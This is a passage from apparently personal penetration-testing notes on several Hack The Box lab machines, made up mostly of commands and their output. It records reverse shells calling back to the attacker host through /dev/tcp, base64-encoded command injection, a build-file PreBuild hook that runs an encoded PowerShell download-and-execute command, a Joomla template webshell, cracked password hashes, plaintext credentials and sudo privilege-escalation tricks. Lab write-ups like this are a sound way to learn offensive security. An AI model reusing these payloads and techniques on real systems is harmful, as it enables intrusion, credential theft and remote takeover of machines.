man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
landscape:x:109:116::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
fwupd-refresh:x:112:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mongodb:x:113:65534::/home/mongodb:/usr/sbin/nologin
angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false


read </rich_text>
        <rich_text link="file L2V0Yy9uZ2lueC9zaXRlcy1hdmFpbGFibGUvZGVmYXVsdA==">/etc/nginx/sites-available/default</rich_text>
        <rich_text> and </rich_text>
        <rich_text link="file L2V0Yy9uZ2lueC9zaXRlcy1hdmFpbGFibGUvZGVmYXVsdA==">/etc/nginx/sites-enabled/default</rich_text>
        <rich_text>

read /var/www/dev/index.js


POST /api/order HTTP/1.1
Host: dev.stocker.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: </rich_text>
        <rich_text link="webs http://dev.stocker.htb/stock">http://dev.stocker.htb/stock</rich_text>
        <rich_text>
Content-Type: application/json
Content-Length: 206
Origin: </rich_text>
        <rich_text link="webs http://dev.stocker.htb">http://dev.stocker.htb</rich_text>
        <rich_text>
Connection: close
Cookie: connect.sid=s%3AbpwuZ4U4mHnJb3zEUE7Lf8d1HufU5bO4.Kdk5th2%2BDl%2FlBjxTxJaIe8PyqTCL4frfPd6QFt8EbXk

{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"&lt;iframe src='/var/www/dev/index.js' height=1000 width=800&gt;","description":"It's a red cup.","image":"","price":32,"currentStock":4,"__v":0,"amount":2}]}


const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&amp;w=1";



ssh angoose@stocker.htb
angoose@stocker.htb's password: 
angoose@stocker:~$
angoose@stocker:~$ whoami
angoose
angoose@stocker:~$ id
uid=1001(angoose) gid=1001(angoose) groups=1001(angoose)
angoose@stocker:~$ 
angoose@stocker:~$ ls
user.txt
angoose@stocker:~$ cat user.txt 
de6c7a26277f0d21586570ab01e2981a


run linpeas.sh


angoose@stocker:/dev/shm$ sudo -l
[sudo] password for angoose: 
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
    
    
create test.js in dev/shm

angoose@stocker:/dev/shm# cat test.js 
require("child_process").spawn("/bin/bash", ["-p"], {stdio: [0, 1, 2]})


angoose@stocker:/dev/shm$ sudo /usr/bin/node /usr/local/scripts/../../../../dev/shm/test.js
root@stocker:/dev/shm# whoami
root
root@stocker:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root)
root@stocker:/dev/shm# 
root@stocker:~# cat root.txt 
f89dc8abee8406f0d06958fad32fc2a2
root@stocker:~#</rich_text>
      </node>
      <node name="creds" unique_id="80" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1692969483" ts_lastsave="1692970526">
        <rich_text>angoose:IHeardPassphrasesArePrettySecure</rich_text>
      </node>
    </node>
    <node name="CozyHosting" unique_id="81" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694008715" ts_lastsave="1701182745">
      <node name="nmap" unique_id="82" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694008718" ts_lastsave="1694008731">
        <rich_text>sudo nmap -p- -sC -sV 10.129.106.161 -oA nmap/all
Starting Nmap 7.94 ( </rich_text>
        <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
        <rich_text> ) at 2023-09-06 15:58 CEST
Nmap scan report for 10.129.106.161
Host is up (0.032s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to </rich_text>
        <rich_text link="webs http://cozyhosting.htb">http://cozyhosting.htb</rich_text>
        <rich_text>
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at </rich_text>
        <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
        <rich_text> .
Nmap done: 1 IP address (1 host up) scanned in 22.46 second</rich_text>
      </node>
      <node name="buster" unique_id="83" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694008731" ts_lastsave="1694011296">
        <rich_text>gobuster vhost -u </rich_text>
        <rich_text link="webs http://cozyhosting.htb">http://cozyhosting.htb</rich_text>
        <rich_text> -w /home/haha150/git/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             </rich_text>
        <rich_text link="webs http://cozyhosting.htb">http://cozyhosting.htb</rich_text>
        <rich_text>
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /home/haha150/git/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Progress: 4989 / 4990 (99.98%)
===============================================================
Finished
===============================================================






dirsearch -u </rich_text>
        <rich_text link="webs http://cozyhosting.htb">http://cozyhosting.htb</rich_text>
        <rich_text>

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/haha150/.dirsearch/reports/cozyhosting.htb/_23-09-06_16-40-29.txt

Error Log: /home/haha150/.dirsearch/logs/errors-23-09-06_16-40-29.log

Target: </rich_text>
        <rich_text link="webs http://cozyhosting.htb/">http://cozyhosting.htb/</rich_text>
        <rich_text>

[16:40:30] Starting: 
[16:40:38] 200 -    0B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js
[16:40:40] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[16:40:40] 400 -  435B  - /a%5c.aspx
[16:40:41] 200 -  198B  - /actuator/sessions
[16:40:41] 200 -  634B  - /actuator
[16:40:41] 200 -   15B  - /actuator/health
[16:40:41] 200 -    5KB - /actuator/env
[16:40:41] 200 -   10KB - /actuator/mappings
[16:40:41] 401 -   97B  - /admin
[16:40:41] 200 -  124KB - /actuator/beans
[16:40:58] 200 -    0B  - /engine/classes/swfupload//swfupload.swf
[16:40:58] 200 -    0B  - /engine/classes/swfupload//swfupload_f9.swf
[16:40:58] 500 -   73B  - /error
[16:40:58] 200 -    0B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/
[16:40:58] 200 -    0B  - /extjs/resources//charts.swf
[16:41:00] 200 -    0B  - /html/js/misc/swfupload//swfupload.swf
[16:41:01] 200 -   12KB - /index
[16:41:03] 200 -    4KB - /login
[16:41:03] 200 -    0B  - /login.wdm%2e
[16:41:04] 204 -    0B  - /logout
[16:41:13] 400 -  435B  - /servlet/%C0%AE%C0%AE%C0%AF</rich_text>
      </node>
      <node name="exploit" unique_id="84" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694011296" ts_lastsave="1694082057">
        <rich_text link="webs http://cozyhosting.htb/actuator">http://cozyhosting.htb/actuator</rich_text>
        <rich_text>

</rich_text>
        <rich_text link="webs http://cozyhosting.htb/actuator/sessions">http://cozyhosting.htb/actuator/sessions</rich_text>
        <rich_text>


{"6DC4002AC25B47F12C30EC3CC5E9087A":"UNAUTHORIZED",
"2A66B90D66B4B02244F2BEC3CE7CB95B":"kanderson",
"1CFBDFF5179EF435A3FCA58333B6F8C4":"UNAUTHORIZED",
"3D16F1B6CE4F4528502BE5A97B380AD7":"UNAUTHORIZED"}


set cookie JSESSIONID to 2A66B90D66B4B02244F2BEC3CE7CB95B

browse to </rich_text>
        <rich_text link="webs http://cozyhosting.htb/admin">http://cozyhosting.htb/admin</rich_text>
        <rich_text>

</rich_text>
        <rich_text link="webs http://cozyhosting.htb/admin?error=usage:%20ssh%20[-46AaCfGgKkMNnqsTtVvXxYy]%20[-B%20bind_interface]%20%20%20%20%20%20%20%20%20%20%20[-b%20bind_address]%20[-c%20cipher_spec]%20[-D%20[bind_address:]port]%20%20%20%20%20%20%20%20%20%20%20[-E%20log_file]%20[-e%20escape_char]%20[-F%20configfile]%20[-I%20pkcs11]%20%20%20%20%20%20%20%20%20%20%20[-i%20identity_file]%20[-J%20[user@]host[:port]]%20[-L%20address]%20%20%20%20%20%20%20%20%20%20%20[-l%20login_name]%20[-m%20mac_spec]%20[-O%20ctl_cmd]%20[-o%20option]%20[-p%20port]%20%20%20%20%20%20%20%20%20%20%20[-Q%20query_option]%20[-R%20address]%20[-S%20ctl_path]%20[-W%20host:port]%20%20%20%20%20%20%20%20%20%20%20[-w%20local_tun[:remote_tun]]%20destination%20[command%20[argument%20...]]">http://cozyhosting.htb/admin?error=usage:%20ssh%20[-46AaCfGgKkMNnqsTtVvXxYy]%20[-B%20bind_interface]%20%20%20%20%20%20%20%20%20%20%20[-b%20bind_address]%20[-c%20cipher_spec]%20[-D%20[bind_address:]port]%20%20%20%20%20%20%20%20%20%20%20[-E%20log_file]%20[-e%20escape_char]%20[-F%20configfile]%20[-I%20pkcs11]%20%20%20%20%20%20%20%20%20%20%20[-i%20identity_file]%20[-J%20[user@]host[:port]]%20[-L%20address]%20%20%20%20%20%20%20%20%20%20%20[-l%20login_name]%20[-m%20mac_spec]%20[-O%20ctl_cmd]%20[-o%20option]%20[-p%20port]%20%20%20%20%20%20%20%20%20%20%20[-Q%20query_option]%20[-R%20address]%20[-S%20ctl_path]%20[-W%20host:port]%20%20%20%20%20%20%20%20%20%20%20[-w%20local_tun[:remote_tun]]%20destination%20[command%20[argument%20...]]</rich_text>
        <rich_text>

send requset in the form

host=test&amp;username=;ping${IFS}-c${IFS}1${IFS}10.10.14.51;


echo "/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.51/9001 0&gt;&amp;1'" | base64 -w0
L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjUxLzkwMDEgMD4mMScK

echo${IFS}L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjUxLzkwMDEgMD4mMScK|base64${IFS}-d|bash


host=test&amp;username=;echo${IFS}L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjUxLzkwMDEgMD4mMScK|base64${IFS}-d|bash;


nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.51] from (UNKNOWN) [10.129.105.236] 44502
bash: cannot set terminal process group (998): Inappropriate ioctl for device
bash: no job control in this shell
app@cozyhosting:/app$ whoami
whoami
app
app@cozyhosting:/app$ id
id
uid=1001(app) gid=1001(app) groups=1001(app)

upgrade shell

unzip the jar cloudhosting-0.0.1.jar

cat application.properties 
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&amp;nvzAQ7XxR


login to postgres

app@cozyhosting:/app$ psql -h 127.0.0.1 -U postgres
Password for user postgres: 
psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=#
postgres=# \c cozyhosting
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "cozyhosting" as user "postgres".

cozyhosting=# select * from users;

   name    |                           password                           | role  
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
 
 
 $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
 
 
 ssh josh@cozyhosting.htb
josh@cozyhosting.htb's password:
josh@cozyhosting:~$ whoami
josh
josh@cozyhosting:~$ id
uid=1003(josh) gid=1003(josh) groups=1003(josh)
josh@cozyhosting:~$
josh@cozyhosting:~$ cat user.txt 
fb4e375b884603ecb6250c56aaef44f1

josh@cozyhosting:~$ sudo -l
[sudo] password for josh: 
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
    
josh@cozyhosting:~$ sudo /usr/bin/ssh -o ProxyCommand=';sh 0&lt;&amp;2 1&gt;&amp;2' x
# id
uid=0(root) gid=0(root) groups=0(root)
# cd
# ls
root.txt
# cat root.txt
1537778522a45c2ff82eeecc87b4ccea</rich_text>
      </node>
      <node name="creds" unique_id="85" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694081770" ts_lastsave="1694081781">
        <rich_text>kanderson:
admin:manchesterunited</rich_text>
      </node>
    </node>
    <node name="Visual" unique_id="107" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1700731332" ts_lastsave="1701475560">
      <node name="nmap" unique_id="108" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1700731334" ts_lastsave="1700731338"/>
      <node name="exploit" unique_id="109" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1700731338" ts_lastsave="1701183134">
        <rich_text>host a gitea instance in docker

sudo docker-compose up

create a new empty repo

clone it and add a dotnet project with hello world

create the .sln 

create the .csproj

cat test/test.csproj 
&lt;Project Sdk="Microsoft.NET.Sdk"&gt;

  &lt;PropertyGroup&gt;
    &lt;OutputType&gt;Exe&lt;/OutputType&gt;
    &lt;TargetFramework&gt;net7.0&lt;/TargetFramework&gt;
    &lt;ImplicitUsings&gt;enable&lt;/ImplicitUsings&gt;
    &lt;Nullable&gt;enable&lt;/Nullable&gt;
  &lt;/PropertyGroup&gt;
  
  &lt;Target Name="PreBuild" BeforeTargets="PreBuildEvent"&gt;
        &lt;Exec Command="powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQAMAAvAHIAZQB2AC4AcABzADEAJwApAAoA"/&gt;
  &lt;/Target&gt;

&lt;/Project&gt;

fetch the repo from web app

nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.40] from (UNKNOWN) [10.129.58.4] 49673
whoami
visual\enox

cat user.txt
970124b5f49a51ce2662979aad588d88
cd C:\xampp\htdocs\uploads

pwd
C:\xampp\htdocs\uploads
powershell Invoke-WebRequest -Uri </rich_text>
        <rich_text link="webs http://10.10.14.40/rev.php">http://10.10.14.40/rev.php</rich_text>
        <rich_text> -Outfile rev.php

http://10.129.58.4/uploads/rev.php?cmd=powershell%20-enc%20SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQAMAAvAHIAZQB2AC4AcABzADEAJwApAAoA

run FullPowers.exe

then run GodPotato-NET4.exe


</rich_text>
      </node>
    </node>
    <node name="Devvortex" unique_id="110" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701475560" ts_lastsave="1701557591">
      <node name="nmap" unique_id="111" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701475563" ts_lastsave="1701475982">
        <rich_text>sudo nmap -p- -sC -sV 10.129.51.120 -oA nmap/all
Starting Nmap 7.94SVN ( </rich_text>
        <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
        <rich_text> ) at 2023-12-02 01:07 CET
Nmap scan report for 10.129.51.120
Host is up (0.029s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to </rich_text>
        <rich_text link="webs http://devvortex.htb/">http://devvortex.htb/</rich_text>
        <rich_text>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at </rich_text>
        <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
        <rich_text> .
Nmap done: 1 IP address (1 host up) scanned in 19.13 seconds</rich_text>
      </node>
      <node name="buster" unique_id="114" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701475982" ts_lastsave="1701475984">
        <rich_text>gobuster vhost --url http://devvortex.htb/ --wordlist /home/haha150/git/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://devvortex.htb/
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /home/haha150/git/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.devvortex.htb Status: 200 [Size: 23221]
Progress: 4989 / 4990 (99.98%)
===============================================================
Finished
===============================================================</rich_text>
      </node>
      <node name="exploit" unique_id="112" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701475707" ts_lastsave="1701546051">
        <rich_text>it is a joomla webserver

google for exploit

</rich_text>
        <rich_text link="webs https://www.exploit-db.com/exploits/51334">https://www.exploit-db.com/exploits/51334</rich_text>
        <rich_text>

http://dev.devvortex.htb/api/index.php/v1/config/application?public=true

{"type":"application","id":"224","attributes":{"user":"lewis","id":224}},{"type":"application","id":"224","attributes":{"password":"P4ntherg0t1n5r3c0n##","id":224}},


lewis:P4ntherg0t1n5r3c0n##

login to administrator page

http://dev.devvortex.htb/administrator/

go to

</rich_text>
        <rich_text link="webs http://dev.devvortex.htb/administrator/index.php?option=com_templates&amp;view=template&amp;id=222&amp;file=L2Vycm9yLnBocA&amp;isMedia=0">http://dev.devvortex.htb/administrator/index.php?option=com_templates&amp;view=template&amp;id=222&amp;file=L2Vycm9yLnBocA&amp;isMedia=0</rich_text>
        <rich_text>

edit error.php

put in webshell php

GET /administrator/templates/atum/error.php?cmd=/bin/bash+-c+'bash+-i+&gt;%26+/dev/tcp/10.10.14.153/9001+0&gt;%261' 

nc -lvnp 9001 
listening on [any] 9001 ...
connect to [10.10.14.153] from (UNKNOWN) [10.129.51.120] 41716
bash: cannot set terminal process group (844): Inappropriate ioctl for device
bash: no job control in this shell
www-data@devvortex:~/dev.devvortex.htb/administrator/templates/atum$ ls /home
ls /home
logan
www-data@devvortex:~/dev.devvortex.htb/administrator/templates/atum$ which python3
&lt;tex.htb/administrator/templates/atum$ which python3                 
/usr/bin/python3
www-data@devvortex:~/dev.devvortex.htb/administrator/templates/atum$ 


www-data@devvortex:~/dev.devvortex.htb$ mysql -h 127.0.0.1 -u lewis -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 4626
Server version: 8.0.35-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.01 sec)

mysql&gt; use joomla;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql&gt; 
mysql&gt; select * from sd4fg_users;
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2023-12-02 19:14:43 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
2 rows in set (0.00 sec)


hashcat -m 3200 hash rockyou.txt

$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho

logan:tequieromucho



ssh logan@devvortex.htb
logan@devvortex.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)
logan@devvortex:~$ whoami
logan
logan@devvortex:~$ id
uid=1000(logan) gid=1000(logan) groups=1000(logan)

sudo -l
[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
    
cat user.txt 
8f0d9a6aa8390211c6d8020a032b06d7

nano xxx.crash

ProblemType: Crash&#13;
DistroRelease: Ubuntu 11.10&#13;
Package: indicator-appmenu 0.2.91-0ubuntu2


sudo /usr/bin/apport-cli -c xxx.crash

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (0.1 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): !
What would you like to do? Your options are:
  S: Send report (0.1 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): 

What would you like to do? Your options are:
  S: Send report (0.1 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): !
What would you like to do? Your options are:
  S: Send report (0.1 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V
!whoami
root
!done  (press RETURN)
!bash
root@devvortex:/var/crash# 
root@devvortex:/var/crash# cd /root
root@devvortex:~# cat root.txt 
f42322ac7777139f343795760ac5a93f
</rich_text>
      </node>
    </node>
    <node name="Hospital" unique_id="115" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701557591" ts_lastsave="1701557608">
      <node name="nmap" unique_id="116" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701557608" ts_lastsave="1701560390">
        <rich_text>sudo nmap -p- -sC -sV 10.129.51.31 -oA nmap/all
Starting Nmap 7.94SVN ( </rich_text>
        <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
        <rich_text> ) at 2023-12-02 23:56 CET
Nmap scan report for 10.129.51.31
Host is up (0.035s latency).
Not shown: 65506 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-12-03 05:58:32Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
443/tcp   open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
